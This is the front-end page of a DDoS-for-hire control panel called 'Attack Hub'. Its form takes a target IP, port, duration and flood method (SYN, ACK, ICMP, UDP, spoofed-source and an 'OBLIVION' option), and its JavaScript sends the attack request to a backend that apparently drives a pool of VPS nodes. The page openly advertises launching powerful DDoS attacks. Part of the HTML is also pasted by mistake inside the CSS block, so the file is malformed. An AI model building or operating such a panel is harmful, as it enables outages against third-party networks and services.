<div id="attack" class="page-content">
    <div class="attack-container">
        <div class="attack-header">
            <h2>Attack Hub</h2>
            <p>Launch powerful DDoS attacks with advanced methods</p>
        </div>

        <form id="attackForm" class="attack-form">
            <div class="form-grid">
                <div class="form-group">
                    <label>Target IP</label>
                    <input type="text" id="target" placeholder="192.168.1.1" required>
                </div>
                
                <div class="form-group">
                    <label>Port</label>
                    <input type="number" id="port" placeholder="80" value="80" required>
                </div>
                
                <div class="form-group">
                    <label>Duration (seconds)</label>
                    <input type="number" id="time" placeholder="60" value="60" required>
                </div>
                
                <div class="form-group">
                    <label>Method</label>
                    <select id="method" required>
                        <option value="">Select Method</option>
                        <optgroup label="Basic Methods">
                            <option value="syn-pps">‚ò†Ô∏è SYN-PPS (High Packet Rate)</option>
                            <option value="syn-gbps">üöÄ SYN-GBPS (Large Packets)</option>
                            <option value="ack-pps">‚ö° ACK-PPS (High Packet Rate)</option>
                            <option value="ack-gbps">üî• ACK-GBPS (Large Packets)</option>
                            <option value="icmp-pps">üî® ICMP-PPS (High Packet Rate)</option>
                            <option value="icmp-gbps">üí£ ICMP-GBPS (Large Packets)</option>
                        </optgroup>
                        <optgroup label="Advanced Methods">
                            <option value="rand-udp">üåÄ RAND-UDP (Random Source)</option>
                            <option value="rand-syn">üå™Ô∏è RAND-SYN (Random Source)</option>
                            <option value="rand-ack">‚ö° RAND-ACK (Random Source)</option>
                            <option value="udp-multi">üéØ UDP-MULTI (Multi-port)</option>
                            <option value="syn-rand">üå™Ô∏è SYN-RAND (Advanced)</option>
                            <option value="ack-rand">‚ö° ACK-RAND (Advanced)</option>
                            <option value="icmp-rand">üì° ICMP-RAND (Random)</option>
                            <option value="oblivion">üíÄ OBLIVION (Ultimate)</option>
                        </optgroup>
                    </select>
                </div>
            </div>

            <div class="attack-actions">
                <button type="submit" class="btn-attack-large">
                    <i class="fas fa-rocket"></i>
                    Launch Attack
                </button>
                <button type="button" class="btn-clear" onclick="clearForm()">
                    <i class="fas fa-times"></i>
                    Clear
                </button>
            </div>
        </form>

        <div class="attack-info">
            <div class="info-card">
                <h4>Attack Status</h4>
                <div id="attackStatus" class="status-idle">
                    <i class="fas fa-info-circle"></i>
                    Ready to launch attack
                </div>
            </div>
            
            <div class="info-card">
                <h4>Available VPS</h4>
                <div id="vpsStatus" class="vps-counter">
                    <i class="fas fa-server"></i>
                    <span id="vpsCount">0</span> nodes available
                </div>
            </div>
        </div>

        <div class="methods-legend">
            <h4>Method Legend</h4>
            <div class="legend-grid">
                <div class="legend-item">
                    <span class="method-tag syn">SYN</span>
                    <span>SYN Flood - TCP synchronization</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag ack">ACK</span>
                    <span>ACK Flood - TCP acknowledgment</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag icmp">ICMP</span>
                    <span>ICMP Flood - Ping flood</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag udp">UDP</span>
                    <span>UDP Flood - UDP packets</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag rand">RAND</span>
                    <span>Random Source - Spoofed IPs</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag special">SPECIAL</span>
                    <span>Special methods - Combined attacks</span>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
/* Attack page specific styles */
.attack-container {
    padding: 20px;
}

.attack-header {
    text-align: center;
    margin-bottom: 30px;
}

.attack-header h2 {
    color: #00ff00;
    font-size: 2.5em;
    margin-bottom: 10px;
    text-shadow: 0 0 10px #00ff00;
}

.attack-form {
    background: rgba(0, 20, 0, 0.8);
    border: 1px solid #00ff00;
    border-radius: 10px;
    padding: 30px;
    margin-bottom: 30px;
}

.form-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

.form-group {
    display: flex;
    flex-direction: column;
}

.form-group label {
    color: #00ff00;
    margin-bottom: 8px;
    font-weight: bold;
}

.form-group input,
.form-group select {
    background: rgba(0, 0, 0, 0.7);
    border: 1px solid #00ff00;
    color: #00ff00;
    padding: 12px;
    border-radius: 5px;
    font-size: 16px;
}

.form-group input:focus,
.form-group select:focus {
    outline: none;
    box-shadow: 0 0 10px #00ff00;
}

.attack-actions {
    display: flex;
    gap: 15px;
    justify-content: center;
}

.btn-attack-large {
    background: linear-gradient(45deg, #ff0000, #ff6600);
    border: none;
    color: white;
    padding: 15px 40px;
    border-radius: 25px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 10px;
    transition: all 0.3s ease;
}

.btn-attack-large:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 20px rgba(255, 0, 0, 0.5);
}

.btn-clear {
    background: rgba(255, 255, 255, 0.1);
    border: 1px solid #fff;
    color: white;
    padding: 15px 30px;
    border-radius: 25px;
    cursor: pointer;
    transition: all 0.3s ease;
}

.btn-clear:hover {
    background: rgba(255, 255, 255, 0.2);
}

.attack-info {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

            <div class="info-card">
                <h4>Attack Status</h4>
                <div id="attackStatus" class="status-idle">
                    <i class="fas fa-info-circle"></i>
                    Ready to launch attack
                </div>
            </div>
            
            <div class="info-card">
                <h4>Available VPS</h4>
                <div id="vpsStatus" class="vps-counter">
                    <i class="fas fa-server"></i>
                    <span id="vpsCount">0</span> nodes available
                </div>
            </div>
        </div>

        <div class="methods-legend">
            <h4>Method Legend</h4>
            <div class="legend-grid">
                <div class="legend-item">
                    <span class="method-tag syn">SYN</span>
                    <span>SYN Flood - TCP synchronization</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag ack">ACK</span>
                    <span>ACK Flood - TCP acknowledgment</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag icmp">ICMP</span>
                    <span>ICMP Flood - Ping flood</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag udp">UDP</span>
                    <span>UDP Flood - UDP packets</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag rand">RAND</span>
                    <span>Random Source - Spoofed IPs</span>
                </div>
                <div class="legend-item">
                    <span class="method-tag special">SPECIAL</span>
                    <span>Special methods - Combined attacks</span>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
// Initialize attack page
function initAttackPage() {
    loadVPSCount();
    setupAttackForm();
}

// Load VPS count
async function loadVPSCount() {
    try {
        const response = await fetch('/api/vps', {
            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
        });
        
        if (response.ok) {
            const vpsList = await response.json();
            document.getElementById('vpsCount').textContent = vpsList.length;
        }
    } catch (error) {
        console.error('Error loading VPS count:', error);
    }
}

// Setup attack form
function setupAttackForm() {
    const form = document.getElementById('attackForm');
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        await launchAttack();
    });
}

// Launch attack
async function launchAttack() {
    const target = document.getElementById('target').value;
    const port = document.getElementById('port').value;
    const time = document.getElementById('time').value;
    const method = document.getElementById('method').value;

    if (!target || !port || !time || !method) {
        updateAttackStatus('Please fill all fields', 'error');
        return;
    }

    const button = document.querySelector('.btn-attack-large');
    button.disabled = true;
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Launching...';

    updateAttackStatus('Preparing attack...', 'preparing');

    try {
        const response = await fetch('/api/attack', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${localStorage.getItem('token')}`
            },
            body: JSON.stringify({ target, port, time, method })
        });

        const result = await response.json();
        
        if (response.ok) {
            updateAttackStatus(`Attack launched! ${result.results.success}/${result.results.total} VPS activated`, 'success');
            document.getElementById('attackForm').reset();
        } else {
            updateAttackStatus(`Error: ${result.error}`, 'error');
        }
    } catch (error) {
        updateAttackStatus(`Network error: ${error.message}`, 'error');
    } finally {
        button.disabled = false;
        button.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
    }
}

// Update attack status
function updateAttackStatus(message, type) {
    const statusElement = document.getElementById('attackStatus');
    statusElement.className = `status-${type}`;
    
    const icons = {
        idle: 'fa-info-circle',
        preparing: 'fa-spinner fa-spin',
        success: 'fa-check-circle',
        error: 'fa-exclamation-circle'
    };
    
    statusElement.innerHTML = `<i class="fas ${icons[type]}"></i> ${message}`;
}

// Clear form
function clearForm() {
    document.getElementById('attackForm').reset();
    updateAttackStatus('Ready to launch attack', 'idle');
}

// Clear status after delay
setInterval(() => {
    const statusElement = document.getElementById('attackStatus');
    if (statusElement.classList.contains('status-success') || 
        statusElement.classList.contains('status-error')) {
        setTimeout(() => {
            updateAttackStatus('Ready to launch attack', 'idle');
        }, 5000);
    }
}, 1000);
</script>
